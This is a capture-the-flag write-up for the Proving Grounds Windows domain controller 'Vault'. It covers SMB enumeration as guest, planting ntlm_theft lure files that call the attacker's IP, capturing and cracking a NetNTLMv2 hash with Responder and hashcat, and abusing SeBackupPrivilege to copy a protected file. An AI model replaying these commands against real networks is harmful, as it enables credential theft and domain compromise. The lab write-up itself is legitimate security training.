---
machine: Vault
platform: Proving Grounds
category: AD
os: Windows
difficulty: Hard
tags: [active-directory, ntlm-theft, responder, sebackupprivilege]
date: 2026-07-15
status: retired
summary: A Windows Active Directory domain controller reachable only as guest — testing a writable file share seeded with NTLM-theft lure files to capture and crack a domain user's NetNTLMv2 hash, then a SeBackupPrivilege abuse technique to read protected files off the DC without ever landing a shell on it.
---

## Enumeration

Nmap Scan:

```bash
──(kali㉿kali)-[192.168.45.206]-[~/pg/vault]
└─$ sudo nmap 192.168.204.172 -p- -T4 -oN portscan
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-15 15:18 -0400
Nmap scan report for 192.168.204.172
Host is up (0.050s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49703/tcp open  unknown
49827/tcp open  unknown


Nmap done: 1 IP address (1 host up) scanned in 3.78 seconds
┌──(kali㉿kali)-[192.168.45.206]-[~/pg/vault]
└─$ sudo nmap 192.168.204.172 -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -sCV -T4 -oN fingerprint
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-15 15:23 -0400
Nmap scan report for 192.168.204.172
Host is up (0.050s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-15 19:23:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-15T19:23:40+00:00
|_ssl-date: 2026-07-15T19:24:19+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2026-07-14T19:16:04
|_Not valid after:  2027-01-13T19:16:04
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-15T19:23:41
|_  start_date: N/A
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.34 seconds
```

Our fingerprinted portscan looks pretty normal for a domain controller. We will start by investigating SMB.

We first add our `DC.vault.offsec vault.offsec` to our /etc/hosts.

We find our anonymous access is disabled but we can get guest access:

```bash
┌──(kali㉿kali)-[192.168.45.206]-[~/pg]
└─$ nxc smb 192.168.204.172 -u '' -p '' --shares
SMB         192.168.204.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:None)
SMB         192.168.204.172 445    DC               [-] vault.offsec\: STATUS_ACCESS_DENIED 
SMB         192.168.204.172 445    DC               [-] Error enumerating shares: Error occurs while reading from remote(104)
┌──(kali㉿kali)-[192.168.45.206]-[~/pg]
└─$ nxc smb 192.168.204.172 -u 'guest' -p '' --shares
SMB         192.168.204.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:None)
SMB         192.168.204.172 445    DC               [+] vault.offsec\guest: 
SMB         192.168.204.172 445    DC               [*] Enumerated shares
SMB         192.168.204.172 445    DC               Share           Permissions     Remark
SMB         192.168.204.172 445    DC               -----           -----------     ------
SMB         192.168.204.172 445    DC               ADMIN$                          Remote Admin
SMB         192.168.204.172 445    DC               C$                              Default share
SMB         192.168.204.172 445    DC               DocumentsShare  READ,WRITE      
SMB         192.168.204.172 445    DC               IPC$            READ            Remote IPC
SMB         192.168.204.172 445    DC               NETLOGON                        Logon server share 
SMB         192.168.204.172 445    DC               SYSVOL                          Logon server share 

```

Curiously we can Read,Write to a custom share called DocumentsShare as guest.

The share is empty, this makes me think we are intended to exploit the write perms to the share:

```bash
┌──(kali㉿kali)-[192.168.45.206]-[~/pg]
└─$ impacket-smbclient vault.offsec/'guest':''@target            
Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# shares
ADMIN$
C$
DocumentsShare
IPC$
NETLOGON
SYSVOL
# use DocumentsShare
# ls
drw-rw-rw-          0  Wed Jul 15 15:42:09 2026 .
drw-rw-rw-          0  Wed Jul 15 15:42:09 2026 ..
# 
```

We can write arbitrary files to this directory but without hoping a processes randomly executes all files in that directory we don't have an immediate means to exploit this. Going to HackTricks to look deeper into this we see we can also try using `enum4linux` to enumerate our `IPC$` share to try to get more insight into whats running on the box.

```text
### [IPC$ Share](https://hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html#ipc-share)

Access to the IPC$ share can be obtained through an anonymous null session, allowing for interaction with services exposed via named pipes. The utility `enum4linux` is useful for this purpose. Utilized properly, it enables the acquisition of:

- Information on the operating system
- Details on the parent domain
- A compilation of local users and groups
- Information on available SMB shares
- The effective system security policy

This functionality is critical for network administrators and security professionals to assess the security posture of SMB (Server Message Block) services on a network. `enum4linux` provides a comprehensive view of the target system’s SMB environment, which is essential for identifying potential vulnerabilities and ensuring that the SMB services are properly secured.

`enum4linux -a -u "guest" -p "" target_ip`

The above command is an example of how `enum4linux` might be used to perform a full enumeration against a target specified by `target_ip`.
```

```bash
┌──(kali㉿kali)-[192.168.45.206]-[~/pg]
└─$ enum4linux -a -u "guest" -p "" 192.168.204.172
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 15 16:25:13 2026

 =========================================( Target Information )=========================================
                                                                    
Target ........... 192.168.204.172                                                                                                                                                                                 
RID Range ........ 500-550,1000-1050
Username ......... 'guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==========================( Enumerating Workgroup/Domain on 192.168.204.172 )==========================
                                                                    
[E] Can't find workgroup/domain                                                                                                           

 ==============================( Nbtstat Information for 192.168.204.172 )==============================
                                                                    
Looking up status of 192.168.204.172                                                                                                                                                                               
No reply from 192.168.204.172

 ==================================( Session Check on 192.168.204.172 )==================================
                                                                    
[+] Server 192.168.204.172 allows sessions using username 'guest', password ''                                                                                                                               
 ===============================( Getting domain SID for 192.168.204.172 )===============================
                                                                    
Domain Name: VAULT                                                                                                                                                                                                 
Domain Sid: S-1-5-21-537427935-490066102-1511301751

[+] Host is part of a domain (not a workgroup)                                                                                                                                            
 =================================( OS information on 192.168.204.172 )=================================
                                                                    
[E] Can't get OS info with smbclient                                                                                                      
[+] Got OS info for 192.168.204.172 from srvinfo:                                                                                         
        192.168.204.172Wk Sv PDC Tim NT                                                                                                    
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b


 ======================================( Users on 192.168.204.172 )======================================
                                                                    
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                      
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                       
 ================================( Share Enumeration on 192.168.204.172 )================================
                                                                    
do_connect: Connection to 192.168.204.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                        
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DocumentsShare  Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.204.172                                                                                                                                                                
//192.168.204.172/ADMIN$        Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                          
//192.168.204.172/C$    Mapping: DENIED Listing: N/A Writing: N/A
//192.168.204.172/DocumentsShare        Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                                                            
NT_STATUS_NO_SUCH_FILE listing \*                                                                                                                                                                                  
//192.168.204.172/IPC$  Mapping: N/A Listing: N/A Writing: N/A
//192.168.204.172/NETLOGON      Mapping: OK Listing: DENIED Writing: N/A
//192.168.204.172/SYSVOL        Mapping: OK Listing: DENIED Writing: N/A

 ==========================( Password Policy Information for 192.168.204.172 )==========================

Password:                                                                                                                                 
[E] Unexpected error from polenum:                                                                                                        

[+] Attaching to 192.168.204.172 using guest

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:192.168.204.172)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient                                                                                          
 =====================================( Groups on 192.168.204.172 )=====================================
                                                                    
[+] Getting builtin groups:                                                                                                               
[+]  Getting builtin group memberships:                                                                                                   
[+]  Getting local groups:                                                                                                                
[+]  Getting local group memberships:                                                                                                     
[+]  Getting domain groups:                                                                                                               
[+]  Getting domain group memberships:                                                                                                    
 =================( Users on 192.168.204.172 via RID cycling (RIDS: 500-550,1000-1050) )=================
                                                                    
[I] Found new SID:                                                                                                                        
S-1-5-21-537427935-490066102-1511301751                                                                                                   
[I] Found new SID:                                                                                                                        
S-1-5-21-537427935-490066102-1511301751                                                                                                   
[I] Found new SID:                                                                                                                        
S-1-5-32                                                                                                                                  
[I] Found new SID:                                                                                                                        
S-1-5-32                                                                                                                                  

[I] Found new SID:                                                                                                                        
S-1-5-32                                                                                                                                  

[I] Found new SID:                                                                                                                        
S-1-5-32                                                                                                                                  

[I] Found new SID:                                                                                                                        
S-1-5-32                                                                                                                                 
[I] Found new SID:                                                                                                                        
S-1-5-32                                                                                                                                  
[I] Found new SID:                                                                                                                        
S-1-5-32                                                                                                                                  
[+] Enumerating users using SID S-1-5-32 and logon username 'guest', password ''                                                                                                                               
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                                                                                  
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-90 and logon username 'guest', password ''                                                                                                                               
[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'guest', password ''                                                                                        
[+] Enumerating users using SID S-1-5-21-4120077281-3590700305-551003606 and logon username 'guest', password ''                                                                                         
S-1-5-21-4120077281-3590700305-551003606-500 DC\Administrator (Local User)                                                                                                                                         
S-1-5-21-4120077281-3590700305-551003606-501 DC\Guest (Local User)
S-1-5-21-4120077281-3590700305-551003606-503 DC\DefaultAccount (Local User)
S-1-5-21-4120077281-3590700305-551003606-504 DC\WDAGUtilityAccount (Local User)
S-1-5-21-4120077281-3590700305-551003606-513 DC\None (Domain Group)

[+] Enumerating users using SID S-1-5-80 and logon username 'guest', password ''                                                                                                                               
[+] Enumerating users using SID S-1-5-21-537427935-490066102-1511301751 and logon username 'guest', password ''                                                                                        
S-1-5-21-537427935-490066102-1511301751-500 VAULT\Administrator (Local User)                                                                                                                                       
S-1-5-21-537427935-490066102-1511301751-501 VAULT\Guest (Local User)
S-1-5-21-537427935-490066102-1511301751-502 VAULT\krbtgt (Local User)
S-1-5-21-537427935-490066102-1511301751-512 VAULT\Domain Admins (Domain Group)
S-1-5-21-537427935-490066102-1511301751-513 VAULT\Domain Users (Domain Group)
S-1-5-21-537427935-490066102-1511301751-514 VAULT\Domain Guests (Domain Group)
S-1-5-21-537427935-490066102-1511301751-515 VAULT\Domain Computers (Domain Group)
S-1-5-21-537427935-490066102-1511301751-516 VAULT\Domain Controllers (Domain Group)
S-1-5-21-537427935-490066102-1511301751-517 VAULT\Cert Publishers (Local Group)
S-1-5-21-537427935-490066102-1511301751-518 VAULT\Schema Admins (Domain Group)
S-1-5-21-537427935-490066102-1511301751-519 VAULT\Enterprise Admins (Domain Group)
S-1-5-21-537427935-490066102-1511301751-520 VAULT\Group Policy Creator Owners (Domain Group)
S-1-5-21-537427935-490066102-1511301751-521 VAULT\Read-only Domain Controllers (Domain Group)
S-1-5-21-537427935-490066102-1511301751-522 VAULT\Cloneable Domain Controllers (Domain Group)
S-1-5-21-537427935-490066102-1511301751-525 VAULT\Protected Users (Domain Group)
S-1-5-21-537427935-490066102-1511301751-526 VAULT\Key Admins (Domain Group)
S-1-5-21-537427935-490066102-1511301751-527 VAULT\Enterprise Key Admins (Domain Group)
S-1-5-21-537427935-490066102-1511301751-1000 VAULT\DC$ (Local User)

 ==============================( Getting printer info for 192.168.204.172 )==============================
result was WERR_INVALID_NAME                                         

enum4linux complete on Wed Jul 15 16:32:51 2026

```

This doesn't yield any info thats particularly surprising.

I created a revshell.exe with msfvenom, started a listener, and placed it in the share to see if it was executed. After waiting for a little while can determine the .exe is not being executed as our listener never fires.

## Foothold

Next I try a similar idea but with a URI attack and using responder so if the user executes the file it evokes a ntlmv2 hash I could try to crack.

We are going to attempt a ntlm-theft attack with a variety of lure file extensions since we don't know what kind of extension the program may be looking for to interact with. We generate many filetypes which actually just attempt to access a file at a network share located at our ip which prompts a ntlmv2 auth to our "smb server" which is spoofed by our `sudo responder -i tun0`

### NTLMv2 Theft via Lures and SMB Write

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft

python3 -m venv venv
source venv/bin/activate

pip install xlsxwriter
python3 ntlm_theft.py -g all -s <attacker_ip> -f lure # this makes the lure files

# connect to the share with smbclient and transfer lures in after opening responder server
smbclient //192.168.204.172/DocumentsShare -U 'guest%'
prompt off
lcd lure #sets local directory to directory with all lures
mput * #transfers all lures into the smbshare specified
```

After this we should catch a hash in our responder if the "user" clicks on it.

```text
[SMB] NTLMv2-SSP Client   : 192.168.204.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:d3099e0d44e1ada7:019F3A7A2C78B36AB5FCA24FE759A023:010100000000000080FCA6498114DD011B19A3C882AA58E000000000020008005700340057005A0001001E00570049004E002D003000420052004E00580035005700480047003400410004003400570049004E002D003000420052004E0058003500570048004700340041002E005700340057005A002E004C004F00430041004C00030014005700340057005A002E004C004F00430041004C00050014005700340057005A002E004C004F00430041004C000700080080FCA6498114DD010600040002000000080030003000000000000000010000000020000089AA92A8AA17227674842877BD92C0EEF101C15360BF57E99844B804AA2DA3E00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200300036000000000000000000                                                                                                               
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[*] Skipping previously captured hash for VAULT\anirudh
[+] Exiting...
```

We can crack this with hashcat -m 5600 for password `SecureHM`

```text
ANIRUDH::VAULT:d3099e0d44e1ada7:019f3a7a2c78b36ab5fca24fe759a023:010100000000000080fca6498114dd011b19a3c882aa58e000000000020008005700340057005a0001001e00570049004e002d003000420052004e00580035005700480047003400410004003400570049004e002d003000420052004e0058003500570048004700340041002e005700340057005a002e004c004f00430041004c00030014005700340057005a002e004c004f00430041004c00050014005700340057005a002e004c004f00430041004c000700080080fca6498114dd010600040002000000080030003000000000000000010000000020000089aa92a8aa17227674842877bd92c0eef101c15360bf57e99844b804aa2da3e00a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200300036000000000000000000:SecureHM
```

`anirudh:SecureHM` is our first credpair.

We can evil-winrm into this user for our foothold. We can navigate to our desktop for the user flag.

In our privs we see we have:

```powershell
*Evil-WinRM* PS C:\Users\anirudh\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

## Privilege Escalation

SeBackupPrivilege, SeRestorePrivilege are particularly interesting privileges, typically associated with using diskshadow and robocopy to copy the ntds.dit DC database.

Upon attempting this though I encounter an error (usually you are a member of Backup Operators for this, which we are not).

We can explore hacktricks to investigate these permissions further. SeBackupPrivileges catches my eye:

```text
To leverage these privileges locally, the following steps are employed:

1. Import necessary libraries:

`Import-Module .\SeBackupPrivilegeUtils.dll Import-Module .\SeBackupPrivilegeCmdLets.dll`

2. Enable and verify `SeBackupPrivilege`:

`Set-SeBackupPrivilege Get-SeBackupPrivilege`

3. Access and copy files from restricted directories, for instance:

`dir C:\Users\Administrator\ Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite`
```

We see that this approach utilizes 2 .dlls from the https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug github.

This allows us to backup restricted files to a file we can read.

After importing these dll's and running the cmdlets we can "copy" the admin flag to a readable directory:

```powershell
C:\Users> Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\proof.txt C:\Users\anirudh\documents\proof.txt -Overwrite
```

We now have the admin flag:
`C:\Users\anirudh\documents> type proof.txt`
